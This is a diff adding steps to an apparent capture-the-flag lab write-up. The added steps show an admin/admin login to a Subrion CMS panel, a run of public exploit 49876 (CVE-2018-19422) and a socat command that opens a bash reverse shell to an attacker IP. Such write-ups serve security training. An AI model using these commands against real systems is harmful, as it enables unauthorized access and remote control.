@@ -32,8 +32,23 @@ According to searchsploit there is a remote execution code exploit that is promp
 
 # Service Enumeration
 
+To access the admin login portal, we tried some initial social engineering username/password combos and gained access using:
 
+	username: admin
+	passwd: admin
 
+*This is a fairly common combination among CTFs*
 
+Moving forward we attempt to run the script using the target IP address with the login parameters for access:
 
+Subrion CMS 4.2.1 - Arbitrary File Upload -> https://www.exploit-db.com/exploits/49876  (CVE: 2018-19422)
+
+	python3 49876.py -u http://exfiltrated.offsec/panel/ -l admin -p admin
+
+Using the above exploit, we were able to gain an initial foothold into the machine!
+
+For a better stabilized shell, we can run the below socat command to output us into a more versatile shell env:
+
+	socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.XXX.XXX:443
 # Privilege Escalation
+
